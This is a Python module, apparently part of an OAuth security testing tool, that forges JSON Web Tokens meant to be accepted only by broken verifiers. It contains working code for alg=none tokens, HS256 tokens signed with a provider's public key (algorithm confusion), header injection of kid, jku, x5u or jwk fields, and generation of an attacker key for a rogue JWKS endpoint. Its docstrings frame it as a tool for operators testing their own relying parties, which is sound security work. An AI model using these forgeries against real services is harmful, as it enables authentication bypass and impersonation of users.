"""Malicious JWS forgery.

Hand-rolled compact serialization (RFC 7515 sec 3.1). PyJWT blocks several of
these patterns outright; we build them ourselves so an operator can feed
forged tokens to their own RP/SP for impact validation.

Nothing here signs anything honestly. Every function returns a token that
would only be accepted by a broken verifier.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from typing import Any

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding as rsa_padding
from cryptography.hazmat.primitives.asymmetric.rsa import (
    RSAPrivateKey,
    RSAPublicKey,
    generate_private_key,
)


class ForgeError(RuntimeError):
    pass


# ---------- compact serialization primitives ----------


def _b64u(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64u_json(obj: Any) -> str:
    return _b64u(json.dumps(obj, separators=(",", ":"), sort_keys=False).encode())


def _compact(header: dict[str, Any], payload: dict[str, Any], signature: bytes) -> str:
    return f"{_b64u_json(header)}.{_b64u_json(payload)}.{_b64u(signature)}"


# ---------- alg=none ----------


def forge_alg_none(claims: dict[str, Any], *, typ: str = "JWT") -> str:
    """RFC 7515 sec 3.6: the 'none' algorithm. Empty signature.

    RFC 8725 sec 3.1 says verifiers MUST reject 'none' unless they explicitly
    opted in. Many libs did not, historically. CVE-2015-9235 (node-jsonwebtoken),
    CVE-2018-1000531 (jsonwebtoken-rs), etc.
    """
    header = {"alg": "none", "typ": typ}
    return _compact(header, claims, b"")


# ---------- HS256 with provider's public key as shared secret ----------


def forge_hs256_with_pubkey(
    claims: dict[str, Any],
    public_key_pem: bytes,
    *,
    typ: str = "JWT",
    kid: str | None = None,
) -> str:
    """HS256 signed with the provider's *public* key bytes as the HMAC key.

    Exploits verifiers that select the HMAC path based on the token's alg
    header but then pass the locally-stored (asymmetric) public key as the
    key material. Classic PyJWT pre-1.5 vulnerability; still found in bespoke
    verifiers today.

    public_key_pem is expected to be the exact PEM bytes the RP would load.
    Any byte-for-byte difference (DER vs PEM, whitespace) breaks the forge --
    that's by design: the attack requires matching what the verifier loads.
    """
    header: dict[str, Any] = {"alg": "HS256", "typ": typ}
    if kid is not None:
        header["kid"] = kid
    signing_input = f"{_b64u_json(header)}.{_b64u_json(claims)}".encode()
    sig = hmac.new(public_key_pem, signing_input, hashlib.sha256).digest()
    return _compact(header, claims, sig)


# ---------- arbitrary header injection ----------


def forge_with_header(
    claims: dict[str, Any],
    header: dict[str, Any],
    signer: "Signer",
) -> str:
    """Build a JWS with an operator-controlled header. Use this to inject
    kid, jku, x5u, or jwk fields that point at attacker-controlled material.

    `signer` is a Signer instance matching the header's alg. The library does
    not cross-check: if the header says RS256 but the signer is ES256, the
    forged token will (correctly) fail a strict verifier. That's useful -- you
    can assemble mismatched tokens to test verifier behavior.
    """
    signing_input = f"{_b64u_json(header)}.{_b64u_json(claims)}".encode()
    sig = signer.sign(signing_input)
    return _compact(header, claims, sig)


# ---------- signers ----------


class Signer:
    alg: str

    def sign(self, data: bytes) -> bytes:
        raise NotImplementedError


class HSSigner(Signer):
    def __init__(self, key: bytes, *, digest: str = "sha256"):
        self.key = key
        self._hash = getattr(hashlib, digest)
        self.alg = {"sha256": "HS256", "sha384": "HS384", "sha512": "HS512"}[digest]

    def sign(self, data: bytes) -> bytes:
        return hmac.new(self.key, data, self._hash).digest()


class RSASigner(Signer):
    def __init__(self, key: RSAPrivateKey, *, digest: str = "sha256"):
        self.key = key
        self.alg = {"sha256": "RS256", "sha384": "RS384", "sha512": "RS512"}[digest]
        self._hash = {
            "sha256": hashes.SHA256(),
            "sha384": hashes.SHA384(),
            "sha512": hashes.SHA512(),
        }[digest]

    def sign(self, data: bytes) -> bytes:
        return self.key.sign(data, rsa_padding.PKCS1v15(), self._hash)


# ---------- attacker key helper ----------


def generate_attacker_rsa(bits: int = 2048) -> tuple[RSAPrivateKey, RSAPublicKey, dict[str, Any]]:
    """Return (private, public, public_jwk). Use public_jwk as the contents of
    the attacker's JWKS endpoint when pivoting a JKU/X5U injection."""
    priv = generate_private_key(public_exponent=65537, key_size=bits)
    pub = priv.public_key()
    numbers = pub.public_numbers()
    n = numbers.n.to_bytes((numbers.n.bit_length() + 7) // 8, "big")
    e = numbers.e.to_bytes((numbers.e.bit_length() + 7) // 8, "big")
    jwk = {
        "kty": "RSA",
        "use": "sig",
        "alg": "RS256",
        "kid": "oauthive-attacker-key",
        "n": _b64u(n),
        "e": _b64u(e),
    }
    return priv, pub, jwk


def public_key_pem(key: RSAPublicKey) -> bytes:
    return key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
